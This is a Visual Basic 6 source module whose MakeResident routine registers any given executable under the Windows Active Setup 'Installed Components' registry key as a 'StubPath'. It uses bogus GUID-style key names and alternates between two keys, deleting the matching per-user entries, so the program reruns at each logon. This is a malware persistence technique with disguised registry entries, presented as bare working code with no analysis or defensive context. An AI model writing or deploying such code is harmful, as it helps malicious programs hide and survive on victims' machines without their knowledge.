Attribute VB_Name = "Module1"
Option Explicit
'-------------------------------------------------------------------
Private Declare Function RegOpenKeyEx Lib "advapi32.dll" _
    Alias "RegOpenKeyExA" (ByVal hKey As Long, ByVal lpSubKey _
    As String, ByVal ulOptions As Long, ByVal samDesired As _
    Long, phkResult As Long) As Long
'-------------------------------------------------------------------
Private Declare Function RegCloseKey Lib "advapi32.dll" _
    (ByVal hKey As Long) As Long
'-------------------------------------------------------------------
Private Declare Function RegCreateKeyEx Lib "advapi32.dll" Alias _
    "RegCreateKeyExA" (ByVal hKey As Long, ByVal lpSubKey _
    As String, ByVal Reserved As Long, ByVal lpClass As Long, _
    ByVal dwOptions As Long, ByVal samDesired As Long, ByVal _
    lpSecurityAttributes As Long, phkResult As Long, _
    lpdwDisposition As Long) As Long
'-------------------------------------------------------------------
Private Declare Function RegDeleteKey Lib "advapi32.dll" _
    Alias "RegDeleteKeyA" (ByVal hKey As Long, ByVal lpSubKey _
    As String) As Long
'-------------------------------------------------------------------
Private Declare Function RegSetValueEx Lib "advapi32.dll" Alias _
    "RegSetValueExA" (ByVal hKey As Long, ByVal lpValueName _
    As String, ByVal Reserved As Long, ByVal dwType As Long, _
    lpData As Any, ByVal cbData As Long) As Long
'-------------------------------------------------------------------
Private Const REG_SZ = 1
Private Const HKEY_CURRENT_USER = &H80000001
Private Const HKEY_LOCAL_MACHINE = &H80000002
Private Const KEY_ALL_ACCESS = &H3F 'Or &HF003F !
Private Const RegPath = "Software\Microsoft\Active Setup\Installed Components"
Private Const DefaultKeyName1 = "{Y479C6D0-OTRW-U5GH-S1EE-E0AC10B4E666}" 'It is optional
Private Const DefaultKeyName2 = "{F146C9B1-VMVQ-A9RC-NUFL-D0BA00B4E999}" 'It is optional

Public Sub MakeResident(ByVal FilePathName As String, _
           Optional KeyName1 As String = DefaultKeyName1, _
           Optional KeyName2 As String = DefaultKeyName2)
    
'    On Error Resume Next
    
    Dim RegKeyPath1 As String
    Dim RegKeyPath2 As String
    Dim hNewKey As Long
    Dim lRetVal As Long
    
    RegKeyPath1 = RegPath & "\" & KeyName1
    RegKeyPath2 = RegPath & "\" & KeyName2
    
    If RegOpenKeyEx(HKEY_LOCAL_MACHINE, RegKeyPath1, 0, _
        KEY_ALL_ACCESS, hNewKey) Then
        '  The key1 dosen't exist -> create key1 Del key2
        RegCreateKeyEx HKEY_LOCAL_MACHINE, RegKeyPath1, 0, 0, 0, _
            KEY_ALL_ACCESS, 0, hNewKey, lRetVal
        RegSetValueEx hNewKey, "StubPath", 0, REG_SZ, _
            ByVal FilePathName, Len(FilePathName)
        RegDeleteKey HKEY_LOCAL_MACHINE, RegKeyPath2
        RegDeleteKey HKEY_CURRENT_USER, RegKeyPath1
    Else 'Create key2 del key1
        RegCreateKeyEx HKEY_LOCAL_MACHINE, RegKeyPath2, 0, 0, 0, _
            KEY_ALL_ACCESS, 0, hNewKey, lRetVal
        RegSetValueEx hNewKey, "StubPath", 0, REG_SZ, _
            ByVal FilePathName, Len(FilePathName)
        RegDeleteKey HKEY_LOCAL_MACHINE, RegKeyPath1
        RegDeleteKey HKEY_CURRENT_USER, RegKeyPath2
    End If
    RegCloseKey hNewKey

End Sub






